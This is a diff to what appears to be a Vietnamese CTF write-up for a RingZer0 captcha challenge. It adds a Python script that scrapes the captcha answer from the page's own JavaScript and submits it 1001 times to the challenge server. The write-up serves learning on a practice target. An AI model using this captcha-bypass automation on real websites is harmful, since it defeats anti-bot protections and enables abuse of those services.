@@ -31,3 +31,34 @@ print(text[:-1])
 ```
 link file tesseract.exe: https://github.com/UB-Mannheim/tesseract/wiki
 Rồi bắt tay vào việc thôi
+Mình đã thử nhưng chữ được chữ mất khiến cho phần captcha không hoàn chỉnh
+-Sau một hồi tìm tiếm writeup trên mạng cuối cùng cũng thấy 1 đoạn code khả thi
+```
+import requests
+import time
+import re
+import os
+import lxml.html
+from requests.auth import HTTPBasicAuth
+
+
+def ch138():
+    s = requests.Session()
+    url = 'http://challenges.ringzer0team.com:10138'
+    for _ in range(1001):
+        time.sleep(0.1)
+        r = s.get('{0}/form1.php'.format(url))
+        m = re.search(r'if \(A == "([a-z0-9]*)"\)', r.text)
+        captcha = m.group(1)
+        r = s.get('{0}/captcha/captchabroken.php?new'.format(url))
+        payload = {'captcha': captcha}
+        r = s.post('{0}/captcha1.php'.format(url), data=payload)
+        doc = lxml.html.document_fromstring(r.text)
+        alert = doc.xpath('//div[contains(@class, "alert")]')[0]
+        msg = alert.text_content().strip()
+        print(msg)
+
+
+if __name__ == '__main__':
+    ch138()
+```    
